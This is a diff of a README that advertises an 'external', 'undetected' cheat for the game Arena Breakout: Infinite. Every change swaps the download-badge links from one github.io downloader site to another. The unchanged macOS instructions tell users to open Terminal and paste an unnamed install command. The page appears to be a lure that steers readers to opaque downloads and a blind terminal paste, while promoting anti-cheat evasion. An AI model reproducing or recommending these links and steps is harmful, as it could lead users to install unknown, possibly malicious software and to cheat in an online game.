@@ -1,9 +1,9 @@
 # 🎮 Arena Breakout: Infinite External — Evidence V2
 
-[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://hydracomptrollercord.github.io/Downloader/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://hydracomptrollercord.github.io/Downloader/)
-[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://hydracomptrollercord.github.io/Downloader/)
+[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://spearsurvive.github.io/win/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://spearsurvive.github.io/win/)
+[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://spearsurvive.github.io/win/)
 
 > The most trusted **Arena Breakout: Infinite External** for 2026 — operates entirely outside the game process with no memory injection, providing a clean and undetected external cheat experience.
 
@@ -45,14 +45,14 @@
 5. 🎮 Launch **Arena Breakout: Infinite** and enter a match
 6. 📋 Press **INSERT** to open the overlay menu
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
 
 ### macOS
 1. Press ⌘ + Space, open **Terminal**
 2. Paste the install command and press Enter
 3. Follow the on-screen prompts
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hydracomptrollercord.github.io/MacDownloader/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
 
 **Menu Controls**
 
